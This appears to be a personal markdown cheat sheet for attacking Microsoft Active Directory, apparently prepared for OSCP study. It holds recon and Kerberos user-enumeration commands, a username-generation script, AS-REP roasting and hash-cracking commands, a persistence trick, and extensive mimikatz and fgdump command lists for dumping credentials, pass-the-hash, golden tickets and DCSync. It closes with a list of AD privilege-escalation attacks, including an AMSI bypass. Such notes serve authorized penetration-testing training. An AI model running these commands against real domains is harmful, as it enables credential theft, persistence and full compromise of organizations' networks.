# Pentesting Active Directory

[Basic Overview](#basic-overview)

[Recon](#recon-ad)

[User Enumeration without Creds](#enumerating-ad-users-without-having-creds-or-session)

[Enumerating AD WITH creds](#enumerating-ad-with-creds)


### Cheatsheat

[John Woodman's site](https://wadcoms.github.io/)

Modeled after GTFOBINs and LOLBAS but for attacking active directory.



# Basic Overview

A administrative tool made by Microsoft, used to create and manage domains, users, and objects within a network. This allows for different privileges and access that scales even with very large numbers of users, computers, domains, ect..

Organized in a Tiered structure of:

1) Domains
2) Trees
3) forests

Domains consist of users, devices, databases (all known also as objects) that are grouped together. Tree's are formed by grouping one or more Domain's. Forests are formed by grouping one or more trees.

### Main concepts of an Active Directory:

1. Directory – Contains all the information about the objects of the Active directory
2. Object – An object references almost anything inside the directory (a user, group, shared folder...)
3. Domain – The objects of the directory are contained inside the domain. Inside a "forest" more than one domain can exist and each of them will have their own objects collection.
4. Tree – Group of domains with the same root. Example: dom.local, email.dom.local, www.dom.local
5. Forest – The forest is the highest level of the organization hierarchy and is composed by a group of trees. The trees are connected by trust relationships.

### Active Directory Domain Services

Active Directory provides several different services, which fall under the umbrella of "Active Directory Domain Services," or AD DS. These services include:

- Domain Services – stores centralized data and manages communication between users and domains; includes login authentication and search functionality
- Certificate Services – creates, distributes, and manages secure certificates
- Lightweight Directory Services – supports directory-enabled applications using the open (LDAP) protocol
- Directory Federation Services – provides single-sign-on (SSO) to authenticate a user in multiple web applications in a single session
- Rights Management – protects copyrighted information by preventing unauthorized use and distribution of digital content

AD DS is included with Windows Server (including Windows Server 10) and is designed to manage client systems. While systems running the regular version of Windows do not have the administrative features of AD DS, they do support Active Directory. This means any Windows computer can connect to a Windows workgroup, provided the user has the correct login credentials. 

# Recon AD

## With No Creds or Sessions

### 1. Pentest the network

- Scan the network, find machines, open ports. Follow the normal network methodology for this. 
- Check printers (can be unique targets in AD) check [hacktricks guide](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/ad-information-in-printers)

 - Enumerate DNS - could give information about key servers in the domain as web, printers, shares, vpn, media, etc:

```bash
gobuster dns -d domain.local -t 25 -w /opt/Seclist/Discovery/DNS/subdomain-top2000.txt
```
### 2. Check for null and Guest access on smb services (this won't work on modern Windows versions):

enum4linux
```bash
enum4linux -a -u "" -p "" <DC IP> && enum4linux -a -u "guest" -p "" <DC IP>
```
smbmap
```bash
smbmap -u "" -p "" -P 445 -H <DC IP> && smbmap -u "guest" -p "" -P 445 -H <DC IP>
```
smblcient
```bash
smbclient -U '%' -L //<DC IP> && smbclient -U 'guest%' -L //
```


### 3. Enumerate Ldap

- Auto-enumerate with nmap:
```bash

```

- Manual-enumeration with ldapsearch (can also use python to interact with api)

```bash
# ldapsearch
# CLI utility for querying an LDAP directory.
# More information: <https://docs.ldap.com/ldap-sdk/docs/tool-usages/ldapsearch.html>.

# Query an LDAP server for all items that are a member of the given group and return the object's displayName value:                                                                                                                  
ldapsearch -D 'admin_DN' -w 'password' -h ldap_host -b base_ou 'memberOf=group1' displayName

# Query an LDAP server with a no-newline password file for all items that are a member of the given group and return the object's displayName value:                                                                                  
ldapsearch -D 'admin_DN' -y 'password_file' -h ldap_host -b base_ou 'memberOf=group1' displayName

# Return 5 items that match the given filter:
ldapsearch -D 'admin_DN' -w 'password' -h ldap_host -b base_ou 'memberOf=group1' -z 5 displayName

# Wait up to 7 seconds for a response:
ldapsearch -D 'admin_DN' -w 'password' -h ldap_host -b base_ou 'memberOf=group1' -l 7 displayName

# Invert the filter:
ldapsearch -D 'admin_DN' -w 'password' -h ldap_host -b base_ou '(!(memberOf=group1))' displayName

# Return all items that are part of multiple groups, returning the display name for each item:
ldapsearch -D 'admin_DN' -w 'password' -h ldap_host '(&(memberOf=group1)(memberOf=group2)(memberOf=group3))' "displayName"                                                                                                            

# Return all items that are members of at least 1 of the specified groups:
ldapsearch -D 'admin_DN' -w 'password' -h ldap_host '(|(memberOf=group1)(memberOf=group1)(memberOf=group3))' displayName                                                                                                              

# Combine multiple boolean logic filters:
ldapsearch -D 'admin_DN' -w 'password' -h ldap_host '(&(memberOf=group1)(memberOf=group2)(!(memberOf=group3)))' displayName                             
```


### 4. Poison the network (dont for oscp exam)

- Responder.py to gather creds
- Access host via relay attack
- Gather creds exposion fak UPNP srvices with Evil-SSDP

### 5. OSINT

- Extract usernames/names from internal documents, social media, services (mainly web) inside the domain environments and also from the publicly available.

- If you find the complete names of company workers, you could try different AD username conventions

## Enumerating AD users without having Creds or Session

You can use Kerberos (the AD gatekeeper) to see if a user exitist

| Username is | Server Response | Server Error |
| - | - | - |
| Invalid | Kerberos Error:  | `KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN` |
| Valid | `TGT in a AS-REP`  | - |
| Valid | Kerberos Error: | `KRB5KDC_ERR_PREAUTH_REQUIRED` |

Serveral Tools exists to help with this including nmap, msf, cme and kerbrute:

```bash
./kerbrute_linux_amd64 userenum -d lab.ropnop.com usernames.txt

nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='DOMAIN'" <IP>

Nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='<domain>',userdb=/root/Desktop/usernames.txt <IP>

msf> use auxiliary/gather/kerberos_enumusers

crackmapexec smb dominio.es  -u '' -p '' --users | awk '{print $4}' | uniq
```

If we already have first and last names the following python script can make common usernames from them:

```python
#!/usr/bin/env python3

'''
NameMash by superkojiman

Generate a list of possible usernames from a person's first and last name. 

https://blog.techorganic.com/2011/07/17/creating-a-user-name-list-for-brute-force-attacks/
'''

import sys
import os.path

if __name__ == '__main__': 
    if len(sys.argv) != 2:
        print(f'usage: {sys.argv[0]} names.txt')
        sys.exit(0)

    if not os.path.exists(sys.argv[1]): 
        print(f'{sys.argv[1]} not found')
        sys.exit(0)

    with open(sys.argv[1]) as f:
        for line in enumerate(f): 

            # remove anything in the name that aren't letters or spaces
            name = ''.join([c for c in line[1] if  c == ' ' or  c.isalpha()])
            tokens = name.lower().split()

            if len(tokens) < 1: 
                # skip empty lines
                continue
            
            # assume tokens[0] is the first name
            fname = tokens[0]

            # remaining elements in tokens[] must be the last name
            lname = ''

            if len(tokens) == 2: 
                # assume traditional first and last name
                # e.g. John Doe
                lname = tokens[-1]

            elif len(tokens) > 2: 
                # assume multi-barrelled surname
                # e.g. Jane van Doe

                # remove the first name
                del tokens[0]

                # combine the multi-barrelled surname
                lname = ''.join([s for s in tokens])

            # create possible usernames
            print(fname + lname)           # johndoe
            print(lname + fname)           # doejohn
            print(fname + '.' + lname)     # john.doe
            print(lname + '.' + fname)     # doe.john
            print(lname + fname[0])        # doej
            print(fname[0] + lname)        # jdoe
            print(lname[0] + fname)        # djoe
            print(fname[0] + '.' + lname)  # j.doe
            print(lname[0] + '.' + fname)  # d.john
            print(fname)                   # john
            print(lname)                   # joe
```

### Okay we have a valid username, how to get the password:

1. ASREPRoats:  If a user doesn't have the attribute DONT_REQ_PREAUTH you can request a AS_REP message for that user that will contain some data encrypted by a derivation of the password of the user.

Enumerating vulnerables users

```ps
Get-DomainUser -PreauthNotRequired -verbose #List vuln users using PowerView
```

Request AS_REP message

```bash
#Try all the usernames in usernames.txt
python GetNPUsers.py jurassic.park/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast
#Use domain creds to extract targets and target them
python GetNPUsers.py jurassic.park/triceratops:Sh4rpH0rns -request -format hashcat -outputfile hashes.asreproast
````

```ps
.\Rubeus.exe asreproast /format:hashcat /outfile:hashes.asreproast [/user:username]
Get-ASREPHash -Username VPN114user -verbose #From ASREPRoast.ps1 (https://github.com/HarmJ0y/ASREPRoast)

#AS-REP Roasting with Rubeus will generate a 4768 with an encryption type of 0x17 and preauth type of 0.
```

Cracking

```bash
john --wordlist=passwords_kerb.txt hashes.asreproast
hashcat -m 18200 --force -a 0 hashes.asreproast passwords_kerb.txt 
```

Persistence 

```ps
#Force preauth not required for a user where you have GenericAll permissions (or permissions to write properties):
Set-DomainObject -Identity <username> -XOR @{useraccountcontrol=4194304} -Verbose
```

2. Password Spraying -Let's try the most common passwords with each of the discovered users, maybe some user is using a bad password (keep in mind the password policy!) or could login with empty password: 


# Enumerating AD WITH creds

Having compromised an account is a big step to start compromising the whole domain, because you are going to be able to start the Active Directory Enumeration:




# Attacking AD

## Cached Creds

If you are already administrator on a domain connected machine you can dump local hashes and try and crack them, or pivot with pass or overpass the hash.

This can be done with fgdump on older machines and mimikatz on most new machines. (Note may have to turn defender off)

## Mimi cheatsheat

```ps
#general
privilege::debug
log
log customlogfilename.log


#sekurlsa
sekurlsa::logonpasswords
sekurlsa::logonPasswords full
sekurlsa::tickets /export
sekurlsa::pth /user:Administrateur /domain:winxp /ntlm:f193d757b4d487ab7e5a3743f038f713 /run:cmd

#kerberos
kerberos::list /export
kerberos::ptt c:\chocolate.kirbi
kerberos::golden /admin:administrateur /domain:chocolate.local /sid:S-1-5-21-130452501-2365100805-3685010670 /krbtgt:310b643c5316c8c3c70a10cfb17e2e31 /ticket:chocolate.kirbi

#crypto
crypto::capi
crypto::cng
crypto::certificates /export
crypto::certificates /export /systemstore:CERT_SYSTEM_STORE_LOCAL_MACHINE
crypto::keys /export
crypto::keys /machine /export

#vault & lsadump
vault::cred
vault::list
token::elevate
vault::cred
vault::list
lsadump::sam
lsadump::secrets
lsadump::cache
token::revert
lsadump::dcsync /user:domain\krbtgt /domain:lab.local

#pth
sekurlsa::pth /user:Administrateur /domain:chocolate.local /ntlm:cc36cf7a8514893efccd332446158b1a
sekurlsa::pth /user:Administrateur /domain:chocolate.local /aes256:b7268361386090314acce8d9367e55f55865e7ef8e670fbe4262d6c94098a9e9
sekurlsa::pth /user:Administrateur /domain:chocolate.local /ntlm:cc36cf7a8514893efccd332446158b1a /aes256:b7268361386090314acce8d9367e55f55865e7ef8e670fbe4262d6c94098a9e9
sekurlsa::pth /user:Administrator /domain:WOSHUB /ntlm:{NTLM_hash} /run:cmd.exe

#ekeys
sekurlsa::ekeys

#dpapi
sekurlsa::dpapi

#minidump
sekurlsa::minidump lsass.dmp

#ptt
kerberos::ptt Administrateur@krbtgt-CHOCOLATE.LOCAL.kirbi

#golden/silver
kerberos::golden /user:utilisateur /domain:chocolate.local /sid:S-1-5-21-130452501-2365100805-3685010670 /krbtgt:310b643c5316c8c3c70a10cfb17e2e31 /id:1107 /groups:513 /ticket:utilisateur.chocolate.kirbi
kerberos::golden /domain:chocolate.local /sid:S-1-5-21-130452501-2365100805-3685010670 /aes256:15540cac73e94028231ef86631bc47bd5c827847ade468d6f6f739eb00c68e42 /user:Administrateur /id:500 /groups:513,512,520,518,519 /ptt /startoffset:-10 /endin:600 /renewmax:10080
kerberos::golden /admin:Administrator /domain:CTU.DOMAIN /sid:S-1-1-12-123456789-1234567890-123456789 /krbtgt:deadbeefboobbabe003133700009999 /ticket:Administrator.kiribi

#tgt
kerberos::tgt

#purge
kerberos::purge
```
## fgdump Cheatsheat:

```cmd
# Dumping a Local Machine Using the Current User
fgdump.exe

# Dumping the Local Machine Using a Different Account
fgdump.exe -h 127.0.0.1 -u AnAdministrativeUser

# Dumping a Remote Machine (192.168.0.10) Using a Specified User (1)
fgdump.exe -h 192.168.0.10 -u AnAdministrativeUser

# Dumping a Remote Machine (192.168.0.10) Using a Specified User (2)
fgdump.exe -h 192.168.0.10 -u AnAdministrativeUser -p l4mep4ssw0rd

# Dumping Many Remote Machines, All With the Same Password
fgdump.exe -f hostfile.txt -u AnAdministrativeUser

# Dumping Many Remote Machines, Each With Its Own Username and Password
fgdump.exe -H combofile.txt

# Dumping Many Remote Machines More Efficiently
fgdump.exe -f hostfile.txt -u AnAdministrativeUser -T 10

# Dumping Hosts and Logging Output
fgdump.exe -h 192.168.0.10 -u AnAdministrativeUser -l myoutput.log

# Dumping Hosts, Logging Output and Viewing Verbose Messages
fgdump.exe -h 192.168.0.10 -u AnAdministrativeUser -l myoutput.log -v -v

# Dumping a Host Without Password Histories
fgdump.exe -h 192.168.0.10 -u AnAdministrativeUser -o

# Dumping a Host Without Cachedump or Pwdump Output
fgdump.exe -h 192.168.0.10 -u AnAdministrativeUser -c (or -w for skipping pwdump)

# Dumping Protected Storage
fgdump.exe -h 192.168.0.10 -u AnAdministrativeUser -s

## Protected storage can contain interesting secrets, including passwords for IE and Outlook if a user opted to have those programs remember passwords.

# Cracking passwords with john
## Passwords will usually be in username:LM_hash:NTLM_hash
## Example:MyUser:1188:E52CAC67419A9A224A3B108F3FA6CB6D:A4F49C406510BDCAB6824EE7C30FD852:::
## Saved to passwordhashes.txt then the command:
./john passwordhashes.txt
```



notes from https://www.youtube.com/watch?v=xowytiyooBk (great youtube vid)





Ten attacks you should master for the OSCP:

10. ReadGMSAPassword 
Description: ReadGMSAPassword allows an attacker to use the password of a Group Managed Service Account which usually has elevated privileges. 
Environment: Search from HacktheBox

9. GenericWrite/GenericAll/AllExtendedRights 
Description: GenericAll allows an attacker to modify the object in question. In this example, we change the password of a Domain Administrator. GenericWrite allows the modification of certain things (More on this in Object from Hackthebox).
Environment: Search from HacktheBox


8. ForceChangePassword 
Description: ForceChangePassword allows an attacker to change the password of the object in question.
Environment: Object from Hackthebox
Timestamp: 16:31

7. PowerView 
Description: Allows for additional manipulation of Active Directory. Many of the commands presented by BloodHound require PowerView.
Environment: Object from Hackthebox
Timestamp: 17:00

6. WriteOwner
Description: WriteOwner permissions allows an attacker to set the owner of the object and make him/herself a member of the object.
Environment: Object from HackTheBox
Timestamp: 23:48

5. SeBackupPrivilege and SeRestorePrivilege
Description: SeBackupPrivilege and SeRestorePrivilege allows the attacker access to any file on the machine given he/her takes the appropriate steps. In this example, we acquire NTDS.dit and System.hive
Environment: Blackfield from Hackthebox
Timestamp: 28:12

4. NTDS.dit and System.hive
Description: With these files and the appropriate permissions, an attacker can dump hashes from the Domain Controller using DCSync.
Environment: Blackfield from Hackthebox
Timestamp: 34:38

3. Account Operators/WriteDACL
Description: In the account operators group, an attacker can create users and place them in non-protected groups. Placing a new user in a group with WriteDACL, enables an attacker to modify the new user's DACL. In this example, we give our new user DCSync rights.
Environment: Forest from Hackthebox 
Timestamp: 42:24

2. ByPassing AMSI 
Description: It may be necessary to bypass the anti-virus in Active Directory. Attackers can attempt to bypass AMSI with the Bypass-4MSI command in Evil-WinRM. Always run this command before introducing a malicious script to the environment. 
Environment: Forest from Hackthebox
Timestamp: 48:11

1.DCSYNC/GetChangesAll/Replication
Description: This is number one because its the most fun. DCSync allows an attacker to impersonate a Failover Domain Controller. In that context, the production Domain Controller shares all user hashes upon request, ergo DCSYNC. GetChangesAll, Replication and AllowedToDelegate all point toward the possibility of DCSYNC.
Environment: Forest/Sizzle 
Timestamp: 53:14
